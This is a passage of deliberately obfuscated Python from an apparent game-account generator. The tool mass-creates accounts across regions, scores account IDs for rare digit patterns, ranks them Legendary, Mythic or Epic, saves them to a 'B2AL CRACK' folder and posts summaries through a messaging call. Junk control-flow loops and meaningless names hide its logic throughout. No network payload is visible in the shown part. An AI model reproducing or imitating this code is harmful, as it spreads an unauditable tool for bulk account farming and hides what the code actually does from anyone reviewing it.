                            lllllIIllllIIlllII = sum(lIIIIIlIlIIlIIIIll) + lIlIIIlllIIIIIIlIlIlIl % 54 - llIlIllIIlIIlllIIlIIllIl
                            break
                        if lIlIlIllIlIIIIIllIllIII == 6858960:
                            lIlIlIllIlIIIIIllIllIII = 2859855
                            continue
                        if lIlIlIllIlIIIIIllIllIII == 9046190:
                            llIlIllIIlIIlllIIlIIllIl = 125084064
                            lIlIlIllIlIIIIIllIllIII = 7617633
                            continue
                        if lIlIlIllIlIIIIIllIllIII == 2469324:
                            lIIIIIlIlIIlIIIIll = [lIlIIIlllIIIIIIlIlIlIl >> 12 & 255 for IIIllIllIllIlIIlIIIl in range(4)]
                            lIlIlIllIlIIIIIllIllIII = 2859855
                            continue
                        if lIlIlIllIlIIIIIllIllIII == 1830393:
                            lIlIlIllIlIIIIIllIllIII = 2469324
                            continue
                        if lIlIlIllIlIIIIIllIllIII == 7617633:
                            lIlIIIlllIIIIIIlIlIlIl = (llIlIllIIlIIlllIIlIIllIl * 4 ^ 9447115) & 65535
                            lIlIlIllIlIIIIIllIllIII = 2469324
                            continue
                IlIIllIIlIIlllIIllIl = 2265701
                continue
            if IlIIllIIlIIlllIIllIl == 6065998:
                IlIIllIIlIIlllIIllIl = 1462015
                continue
            if IlIIllIIlIIlllIIllIl == 6038758:
                lIIlIllIIIIIlIIIIll = int(lIlllIIIllIlIIIll // 3600)
                IlIIllIIlIIlllIIllIl = 1462015
                continue
            if IlIIllIIlIIlllIIllIl == 5740406:
                IlIIllIIlIIlllIIllIl = 5509617
                continue
            if IlIIllIIlIIlllIIllIl == 1462015:
                IllIIIIIIlllllllIlIIIll = int(lIlllIIIllIlIIIll % 3600 // 60)
                IlIIllIIlIIlllIIllIl = 4565981
                continue
            if IlIIllIIlIIlllIIllIl == 9765439:
                lllIIIlIIlIIIIIIlllIIIIl = f'{lIIlIllIIIIIlIIIIll:02d}:{IllIIIIIIlllllllIlIIIll:02d}:{seconds:02d}'
                IlIIllIIlIIlllIIllIl = 6552289
                continue
            if IlIIllIIlIIlllIIllIl == 6552289:
                text = f'🏁 <b>GENERATION COMPLETED!</b>\n\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n📊 <b>RARE ACCOUNTS FOUND:</b>\n🔥 <b>Legendary:</b> {getattr(self, 'total_legendary')}\n💜 <b>Mythic:</b> {getattr(self, 'total_mythic')}\n💜 <b>Epic:</b> {getattr(self, 'total_epic')}\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n🌍 <b>Region:</b> {getattr(self, 'region')}\n⏱️ <b>Time:</b> {lllIIIlIIlIIIIIIlllIIIIl}\n🎯 <b>Target:</b> {getattr(self, 'target'):,} accounts\n\n<b>✅ All accounts saved!</b>\n<b>📁 Check folder B2AL CRACK/</b>\n\n#JONSKY #Completed\n'
                IlIIllIIlIIlllIIllIl = 5509617
                continue
            if IlIIllIIlIIlllIIllIl == 2265701:
                lIlllIIIllIlIIIll = getattr(IlllllIIllIIllIIll, 'time')() - getattr(self, 'start_time')
                IlIIllIIlIIlllIIllIl = 6038758
                continue
            if IlIIllIIlIIlllIIllIl == 4565981:
                seconds = int(lIlllIIIllIlIIIll % 60)
                IlIIllIIlIIlllIIllIl = 9765439
                continue

    def send_summary(self):
        IlIlllllIIIlIlI = 8370793
        while True:
            if IlIlllllIIIlIlI == 6599741:
                text += f'\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n🌍 <b>Region:</b> {getattr(self, 'region')}\n⏰ <b>Time:</b> {getattr(getattr(IllIIIIlIIllIIIIIIllll, 'now')(), 'strftime')('%Y-%m-%d %H:%M:%S')}\n\n#JONSKY #RareSummary\n'
                IlIlllllIIIlIlI = 2975036
                continue
            if IlIlllllIIIlIlI == 9139999:
                IlIlllllIIIlIlI = 6599741
                continue
            if IlIlllllIIIlIlI == 1439519:
                text = f'📊 <b>RARE ACCOUNTS SUMMARY</b>\n\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n🔥 <b>LEGENDARY ({getattr(self, 'total_legendary')}):</b>\n'
                IlIlllllIIIlIlI = 6192915
                continue
            if IlIlllllIIIlIlI == 5910900:
                if getattr(self, 'total_legendary') == 0 and getattr(self, 'total_mythic') == 0 and (getattr(self, 'total_epic') == 0):
                    return
                IlIlllllIIIlIlI = 1439519
                continue
            if IlIlllllIIIlIlI == 3592440:
                IlIlllllIIIlIlI = 7212477
                continue
            if IlIlllllIIIlIlI == 7212477:
                text += f'\n💜 <b>MYTHIC ({getattr(self, 'total_mythic')}):</b>\n'
                IlIlllllIIIlIlI = 7029067
                continue
            if IlIlllllIIIlIlI == 2975036:
                getattr(self, 'send_message')(text)
                break
            if IlIlllllIIIlIlI == 6192915:
                if getattr(self, 'legendary_list'):
                    for acc in getattr(self, 'legendary_list')[-20:]:
                        text += f'  <code>{acc['aid']}</code> | {acc['name']} (Score: {acc['score']})\n'
                else:
                    text += '  None\n'
                IlIlllllIIIlIlI = 7212477
                continue
            if IlIlllllIIIlIlI == 5775713:
                text += f'\n💜 <b>EPIC ({getattr(self, 'total_epic')}):</b>\n'
                IlIlllllIIIlIlI = 3479699
                continue
            if IlIlllllIIIlIlI == 3479699:
                if getattr(self, 'epic_list'):
                    for acc in getattr(self, 'epic_list')[-20:]:
                        text += f'  <code>{acc['aid']}</code> | {acc['name']} (Score: {acc['score']})\n'
                else:
                    text += '  None\n'
                IlIlllllIIIlIlI = 6599741
                continue
            if IlIlllllIIIlIlI == 1324029:
                IlIlllllIIIlIlI = 9139999
                continue
            if IlIlllllIIIlIlI == 8370793:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][19] == 80:
                    IlIIIlIIIllIlIIIlI = 2692193
                    while True:
                        if IlIIIlIIIllIlIIIlI == 3285429:
                            IlIlIlIIlIlllIIllllIII = [IlIllIIlIlIlllIlllIllIlI >> 4 & 255 for IIIIIlIlIlIIllIlIllI in range(5)]
                            IlIIIlIIIllIlIIIlI = 8724391
                            continue
                        if IlIIIlIIIllIlIIIlI == 1646452:
                            IlIIIlIIIllIlIIIlI = 5122345
                            continue
                        if IlIIIlIIIllIlIIIlI == 8724391:
                            IlIIIIIIllIlIIllIlIlI = sum(IlIlIlIIlIlllIIllllIII) + IlIllIIlIlIlllIlllIllIlI % 3 - IIIIlIlllIIllIIIIIlIIII
                            break
                        if IlIIIlIIIllIlIIIlI == 5122345:
                            IlIllIIlIlIlllIlllIllIlI = (IIIIlIlllIIllIIIIIlIIII * 5 ^ 10614249) & 4294967295
                            IlIIIlIIIllIlIIIlI = 3285429
                            continue
                        if IlIIIlIIIllIlIIIlI == 7441705:
                            IlIIIlIIIllIlIIIlI = 3285429
                            continue
                        if IlIIIlIIIllIlIIIlI == 2692193:
                            IIIIlIlllIIllIIIIIlIIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][29] * 159653 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][5]
                            IlIIIlIIIllIlIIIlI = 5122345
                            continue
                        if IlIIIlIIIllIlIIIlI == 8612976:
                            IlIIIlIIIllIlIIIlI = 3285429
                            continue
                IlIlllllIIIlIlI = 5910900
                continue
            if IlIlllllIIIlIlI == 7029067:
                if getattr(self, 'mythic_list'):
                    for acc in getattr(self, 'mythic_list')[-20:]:
                        text += f'  <code>{acc['aid']}</code> | {acc['name']} (Score: {acc['score']})\n'
                else:
                    text += '  None\n'
                IlIlllllIIIlIlI = 5775713
                continue
IIllIlIIIIIIIIl = IllIIIlIllIIlIIl()

def IIIIllIIIIllIllllII():
    llIIIllllIIIIlIlIIIIlll = 1446705
    while True:
        if llIIIllllIIIIlIlIIIIlll == 4284235:
            if getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(IlIIlIIllllIlIlIIllIlllI):
                data = llIIIlIIlllIIIll(IlIIlIIllllIlIlIIllIlllI)
                IlIIlIIlllIllIII['ghost'] += len(data)
            llIIIllllIIIIlIlIIIIlll = 1431233
            continue
        if llIIIllllIIIIlIlIIIIlll == 6747596:
            for folder, key in [(lllIllIIlIlIIIlII, 'rare'), (llIlIlIlIlIlllIlllI, 'epic'), (IIIllllllIIIIIIIllIIl, 'mythic'), (IIIlIlIlIIlIlIlIlIIIll, 'legendary')]:
                if getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(folder):
                    for f in getattr(IllIlllllIlIIllIlIllI, 'listdir')(folder):
                        if getattr(f, 'endswith')('.json') and 'emergency' not in f:
                            lIlIIIlllIllIllllI = 6433073
                            while True:
                                if lIlIIIlllIllIllllI == 4644724:
                                    lIlIIIlllIllIllllI = 6433073
                                    continue
                                if lIlIIIlllIllIllllI == 7145535:
                                    data = llIIIlIIlllIIIll(IlIIlIIllllIlIlIIllIlllI)
                                    lIlIIIlllIllIllllI = 4184959
                                    continue
                                if lIlIIIlllIllIllllI == 4184959:
                                    IlIIlIIlllIllIII[key] += len(data)
                                    break
                                if lIlIIIlllIllIllllI == 6433073:
                                    IlIIlIIllllIlIlIIllIlllI = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(folder, f)
                                    lIlIIIlllIllIllllI = 7145535
                                    continue
            llIIIllllIIIIlIlIIIIlll = 7355472
            continue
        if llIIIllllIIIIlIlIIIIlll == 1431233:
            IlIIlIIlllIllIII['total'] = sum(getattr(IlIIlIIlllIllIII, 'values')())
            llIIIllllIIIIlIlIIIIlll = 5355943
            continue
        if llIIIllllIIIIlIlIIIIlll == 2646521:
            input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter to continue...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            break
        if llIIIllllIIIIlIlIIIIlll == 3115493:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}╢')
            llIIIllllIIIIlIlIIIIlll = 5684242
            continue
        if llIIIllllIIIIlIlIIIIlll == 1298851:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            llIIIllllIIIIlIlIIIIlll = 6085002
            continue
        if llIIIllllIIIIlIlIIIIlll == 4744683:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}Rare             {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{IlIIlIIlllIllIII['rare']:,}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIllllIIIIlIlIIIIlll = 7611170
            continue
        if llIIIllllIIIIlIlIIIIlll == 7576710:
            llIIIllllIIIIlIlIIIIlll = 1775732
            continue
        if llIIIllllIIIIlIlIIIIlll == 1775732:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            llIIIllllIIIIlIlIIIIlll = 5586150
            continue
        if llIIIllllIIIIlIlIIIIlll == 5684242:
            IlIIlIIlllIllIII = {'normal': 0, 'rare': 0, 'epic': 0, 'mythic': 0, 'legendary': 0, 'ghost': 0, 'total': 0}
            llIIIllllIIIIlIlIIIIlll = 3647969
            continue
        if llIIIllllIIIIlIlIIIIlll == 5355943:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Normal Accounts  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{IlIIlIIlllIllIII['normal']:,}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIllllIIIIlIlIIIIlll = 4744683
            continue
        if llIIIllllIIIIlIlIIIIlll == 5148752:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}Legendary        {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{IlIIlIIlllIllIII['legendary']:,}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIllllIIIIlIlIIIIlll = 1929434
            continue
        if llIIIllllIIIIlIlIIIIlll == 1929434:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}Ghost            {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{IlIIlIIlllIllIII['ghost']:,}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIllllIIIIlIlIIIIlll = 1775732
            continue
        if llIIIllllIIIIlIlIIIIlll == 1446705:
            llIIIllllIIIIlIlIIIIlll = 1945789
            continue
        if llIIIllllIIIIlIlIIIIlll == 8392976:
            llIIIllllIIIIlIlIIIIlll = 7576710
            continue
        if llIIIllllIIIIlIlIIIIlll == 4999547:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            llIIIllllIIIIlIlIIIIlll = 2646521
            continue
        if llIIIllllIIIIlIlIIIIlll == 8164768:
            if IlIIlIIlllIllIII['total'] > 0:
                IlllIlllIlIlllIIIlIlIlI = 1735684
                while True:
                    if IlllIlllIlIlllIIIlIlIlI == 3515971:
                        IlllIlllIlIlllIIIlIlIlI = 6456352
                        continue
                    if IlllIlllIlIlllIIIlIlIlI == 6456352:
                        IlllIlllIlIlllIIIlIlIlI = 5978683
                        continue
                    if IlllIlllIlIlllIIIlIlIlI == 7026014:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}📊 RARITY DISTRIBUTION{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                        IlllIlllIlIlllIIIlIlIlI = 5978683
                        continue
                    if IlllIlllIlIlllIIIlIlIlI == 8094016:
                        for name, key, lllllIIIIIlIlIlIllI in [('Legendary', 'legendary', getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')), ('Mythic', 'mythic', getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW')), ('Epic', 'epic', getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')), ('Rare', 'rare', getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')), ('Normal', 'normal', getattr(IlIIIIIIlIIlIlll, 'GREEN2'))]:
                            lIlIllIllllIIIlIIIIIIl = 8469336
                            while True:
                                if lIlIllIllllIIIlIIIIIIl == 9991603:
                                    lIlIllIllllIIIlIIIIIIl = 4030007
                                    continue
                                if lIlIllIllllIIIlIIIIIIl == 3346721:
                                    lIlIllIllllIIIlIIIIIIl = 8469336
                                    continue
                                if lIlIllIllllIIIlIIIIIIl == 6340767:
                                    lIlIllIllllIIIlIIIIIIl = 2743890
                                    continue
                                if lIlIllIllllIIIlIIIIIIl == 2743890:
                                    print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {lllllIIIIIlIlIlIllI}{name:<9}{getattr(IlIIIIIIlIIlIlll, 'RST')} {lIIlIIIllllIIIllIIlIlll} {lIIlllIlIIlllIlIIIIllll:.2f}%{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                                    break
                                if lIlIllIllllIIIlIIIIIIl == 3645747:
                                    lIIlIIIllllIIIllIIlIlll = '█' * IIlIIIlllIlIIIlIIIlI + '░' * (lIlIlIllllIlIll - IIlIIIlllIlIIIlIIIlI)
                                    lIlIllIllllIIIlIIIIIIl = 2743890
                                    continue
                                if lIlIllIllllIIIlIIIIIIl == 4030007:
                                    lIIlllIlIIlllIlIIIIllll = IIlllIllIIlIlIIIlIll / IlIIlIIlllIllIII['total'] * 100
                                    lIlIllIllllIIIlIIIIIIl = 6722510
                                    continue
                                if lIlIllIllllIIIlIIIIIIl == 8469336:
                                    IIlllIllIIlIlIIIlIll = IlIIlIIlllIllIII[key]
                                    lIlIllIllllIIIlIIIIIIl = 4030007
                                    continue
                                if lIlIllIllllIIIlIIIIIIl == 6722510:
                                    IIlIIIlllIlIIIlIIIlI = int(IIlllIllIIlIlIIIlIll / IlIIlIIlllIllIII['total'] * lIlIlIllllIlIll)
                                    lIlIllIllllIIIlIIIIIIl = 3645747
                                    continue
                        break
                    if IlllIlllIlIlllIIIlIlIlI == 1735684:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}╢')
                        IlllIlllIlIlllIIIlIlIlI = 7026014
                        continue
                    if IlllIlllIlIlllIIIlIlIlI == 5978683:
                        lIlIlIllllIlIll = 30
                        IlllIlllIlIlllIIIlIlIlI = 8094016
                        continue
            llIIIllllIIIIlIlIIIIlll = 4999547
            continue
        if llIIIllllIIIIlIlIIIIlll == 3662199:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW')}Mythic           {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{IlIIlIIlllIllIII['mythic']:,}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIllllIIIIlIlIIIIlll = 5148752
            continue
        if llIIIllllIIIIlIlIIIIlll == 9506550:
            get_runtime_config()
            llIIIllllIIIIlIlIIIIlll = 1298851
            continue
        if llIIIllllIIIIlIlIIIIlll == 7611170:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}Epic             {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{IlIIlIIlllIllIII['epic']:,}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIllllIIIIlIlIIIIlll = 3662199
            continue
        if llIIIllllIIIIlIlIIIIlll == 5586150:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'BOLD')}{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}TOTAL            {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'BOLD')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{IlIIlIIlllIllIII['total']:,}{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIllllIIIIlIlIIIIlll = 8164768
            continue
        if llIIIllllIIIIlIlIIIIlll == 7355472:
            IlIIlIIllllIlIlIIllIlllI = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(IIIIllIIIIlIllIlll, 'ghost.json')
            llIIIllllIIIIlIlIIIIlll = 4284235
            continue
        if llIIIllllIIIIlIlIIIIlll == 6085002:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ ACCOUNT STATISTICS ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIIIllllIIIIlIlIIIIlll = 3115493
            continue
        if llIIIllllIIIIlIlIIIIlll == 3647969:
            for region in ['ID', 'ME', 'IND', 'VN', 'TH', 'BD', 'PK', 'TW', 'CIS', 'SAC']:
                IlIIlIIllllIlIlIIllIlllI = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(IlIlIIIIlllIIllIIl, f'accounts-{region}.json')
                if getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(IlIIlIIllllIlIlIIllIlllI):
                    data = llIIIlIIlllIIIll(IlIIlIIllllIlIlIIllIlllI)
                    IlIIlIIlllIllIII['normal'] += len(data)
            llIIIllllIIIIlIlIIIIlll = 6747596
            continue
        if llIIIllllIIIIlIlIIIIlll == 1945789:
            load_license()
            llIIIllllIIIIlIlIIIIlll = 9506550
            continue

def IllIIIlIlIlllII(account_data):
    llIIIlIIlIIIlllllIlIlIII = 2750668
    while True:
        if llIIIlIIlIIIlllllIlIlIII == 2295422:
            llIIIlIIlIIIlllllIlIlIII = 8615939
            continue
        if llIIIlIIlIIIlllllIlIlIII == 2831654:
            if len(lIIIllIIlllIllIll) >= 3:
                for i in range(len(lIIIllIIlllIllIll) - 2):
                    if lIIIllIIlllIllIll[i] == lIIIllIIlllIllIll[i + 1] == lIIIllIIlllIllIll[i + 2]:
                        if not (i + 3 < len(lIIIllIIlllIllIll) and lIIIllIIlllIllIll[i] == lIIIllIIlllIllIll[i + 3]):
                            llIIIlIllllIIll = 4041322
                            while True:
                                if llIIIlIllllIIll == 9217576:
                                    getattr(llllllIllllIIIl, 'append')(f'TRIPLE_IDENTICAL+{lIlIlIlIllllIlIlllIIlll}')
                                    break
                                if llIIIlIllllIIll == 6566503:
                                    score += lIlIlIlIllllIlIlllIIlll
                                    llIIIlIllllIIll = 9217576
                                    continue
                                if llIIIlIllllIIll == 8040868:
                                    llIIIlIllllIIll = 4041322
                                    continue
                                if llIIIlIllllIIll == 4041322:
                                    lIlIlIlIllllIlIlllIIlll = 5
                                    llIIIlIllllIIll = 6566503
                                    continue
                        break
            llIIIlIIlIIIlllllIlIlIII = 5034246
            continue
        if llIIIlIIlIIIlllllIlIlIII == 7484360:
            if len(lIIIllIIlllIllIll) >= 5:
                IlIllIIlIIlIlIlll = 7150463
                while True:
                    if IlIllIIlIIlIlIlll == 6547255:
                        IlIllIIlIIlIlIlll = 4376996
                        continue
                    if IlIllIIlIIlIlIlll == 5294153:
                        if IlIIIllIIIIlIIIl or IIIllIIlIlllIllIl:
                            IlllllIIlIIIIIlllIIII = 4418158
                            while True:
                                if IlllllIIlIIIIIlllIIII == 9332891:
                                    IlllllIIlIIIIIlllIIII = 9332891
                                    continue
                                if IlllllIIlIIIIIlllIIII == 1548036:
                                    score += lIlIlIlIllllIlIlllIIlll
                                    IlllllIIlIIIIIlllIIII = 4901178
                                    continue
                                if IlllllIIlIIIIIlllIIII == 4901178:
                                    getattr(llllllIllllIIIl, 'append')(f'SEQUENTIAL+{lIlIlIlIllllIlIlllIIlll}')
                                    break
                                if IlllllIIlIIIIIlllIIII == 5414198:
                                    IlllllIIlIIIIIlllIIII = 9332891
                                    continue
                                if IlllllIIlIIIIIlllIIII == 4418158:
                                    lIlIlIlIllllIlIlllIIlll = min(8, len(lIIIllIIlllIllIll))
                                    IlllllIIlIIIIIlllIIII = 1548036
                                    continue
                        break
                    if IlIllIIlIIlIlIlll == 4376996:
                        IIIllIIlIlllIllIl = all((lIIIllIIlllIllIll[i] - 1 == lIIIllIIlllIllIll[i + 1] for i in range(len(lIIIllIIlllIllIll) - 1)))
                        IlIllIIlIIlIlIlll = 5294153
                        continue
                    if IlIllIIlIIlIlIlll == 7150463:
                        IlIIIllIIIIlIIIl = all((lIIIllIIlllIllIll[i] + 1 == lIIIllIIlllIllIll[i + 1] for i in range(len(lIIIllIIlllIllIll) - 1)))
                        IlIllIIlIIlIlIlll = 4376996
                        continue
            llIIIlIIlIIIlllllIlIlIII = 1827217
            continue
        if llIIIlIIlIIIlllllIlIlIII == 4579946:
            score = 0
            llIIIlIIlIIIlllllIlIlIII = 5699952
            continue
        if llIIIlIIlIIIlllllIlIlIII == 2750668:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28] * 16 + 110 == 3963:
                IIIlIlllIIlIIIIIl = 7873945
                while True:
                    if IIIlIlllIIlIIIIIl == 5429862:
                        IIIlIlllIIlIIIIIl = 1845447
                        continue
                    if IIIlIlllIIlIIIIIl == 2007627:
                        IIIlIlllIIlIIIIIl = 1845447
                        continue
                    if IIIlIlllIIlIIIIIl == 6561713:
                        lllllIlIlIlllIllllIlllII = sum(lIlIlllIlIlIlllIlIlllIIl) + IIIIlIllIlIlllIlIIll % 31 - llIlllIIIlIllI
                        break
                    if IIIlIlllIIlIIIIIl == 7873945:
                        llIlllIIIlIllI = 16326906
                        IIIlIlllIIlIIIIIl = 8876883
                        continue
                    if IIIlIlllIIlIIIIIl == 8876883:
                        IIIIlIllIlIlllIlIIll = (llIlllIIIlIllI * 3 ^ 9857313) & 16777215
                        IIIlIlllIIlIIIIIl = 1845447
                        continue
                    if IIIlIlllIIlIIIIIl == 1845447:
                        lIlIlllIlIlIlllIlIlllIIl = [IIIIlIllIlIlllIlIIll >> 11 & 255 for lIIIlllIIlllIIIIIllIlI in range(3)]
                        IIIlIlllIIlIIIIIl = 6561713
                        continue
            llIIIlIIlIIIlllllIlIlIII = 4118657
            continue
        if llIIIlIIlIIIlllllIlIlIII == 9084639:
            llIIIlIIlIIIlllllIlIlIII = 6839254
            continue
        if llIIIlIIlIIIlllllIlIlIII == 9547883:
            return (False, None, None, score)
            break
        if llIIIlIIlIIIlllllIlIlIII == 8615939:
            if score >= 20:
                rarity_level = 'LEGENDARY'
            elif score >= 15:
                rarity_level = 'MYTHIC'
            elif score >= 11:
                rarity_level = 'EPIC'
            elif score >= 7:
                rarity_level = 'RARE'
            elif score >= 5:
                rarity_level = 'UNCOMMON'
            else:
                rarity_level = 'COMMON'
            llIIIlIIlIIIlllllIlIlIII = 7102748
            continue
        if llIIIlIIlIIIlllllIlIlIII == 1827217:
            if len(lIIIllIIlllIllIll) >= 4:
                llllIIIIlIIIlIIlIIlIll = [lIIIllIIlllIllIll[i + 1] - lIIIllIIlllIllIll[i] for i in range(len(lIIIllIIlllIllIll) - 1)]
                if len(set(llllIIIIlIIIlIIlIIlIll)) == 1 and abs(llllIIIIlIIIlIIlIIlIll[0]) > 1:
                    llIIIIIllIIIIIlllIII = 1153180
                    while True:
                        if llIIIIIllIIIIIlllIII == 2364602:
                            llIIIIIllIIIIIlllIII = 8588329
                            continue
                        if llIIIIIllIIIIIlllIII == 3073322:
                            getattr(llllllIllllIIIl, 'append')(f'ARITHMETIC+{lIlIlIlIllllIlIlllIIlll}')
                            break
                        if llIIIIIllIIIIIlllIII == 1153180:
                            lIlIlIlIllllIlIlllIIlll = min(6, len(lIIIllIIlllIllIll))
                            llIIIIIllIIIIIlllIII = 6092840
                            continue
                        if llIIIIIllIIIIIlllIII == 8588329:
                            llIIIIIllIIIIIlllIII = 2364602
                            continue
                        if llIIIIIllIIIIIlllIII == 6092840:
                            score += lIlIlIlIllllIlIlllIIlll
                            llIIIIIllIIIIIlllIII = 3073322
                            continue
            llIIIlIIlIIIlllllIlIlIII = 6228959
            continue
        if llIIIlIIlIIIlllllIlIlIII == 4118657:
            account_id = getattr(account_data, 'get')('account_id', '')
            llIIIlIIlIIIlllllIlIlIII = 7891919
            continue
        if llIIIlIIlIIIlllllIlIlIII == 7102748:
            if score >= lIIllIIIIIIlIIIIII:
                return (True, rarity_level, f'Score:{score}|{getattr(',', 'join')(llllllIllllIIIl)}', score)
            llIIIlIIlIIIlllllIlIlIII = 9547883
            continue
        if llIIIlIIlIIIlllllIlIlIII == 5034246:
            if len(lIIIllIIlllIllIll) >= 4 and len(set(lIIIllIIlllIllIll)) == 1:
                llIIlIllIIllIIlllllI = 3388562
                while True:
                    if llIIlIllIIllIIlllllI == 1353499:
                        llIIlIllIIllIIlllllI = 9773826
                        continue
                    if llIIlIllIIllIIlllllI == 5510291:
                        score += lIlIlIlIllllIlIlllIIlll
                        llIIlIllIIllIIlllllI = 9320695
                        continue
                    if llIIlIllIIllIIlllllI == 6844521:
                        llIIlIllIIllIIlllllI = 9773826
                        continue
                    if llIIlIllIIllIIlllllI == 3388562:
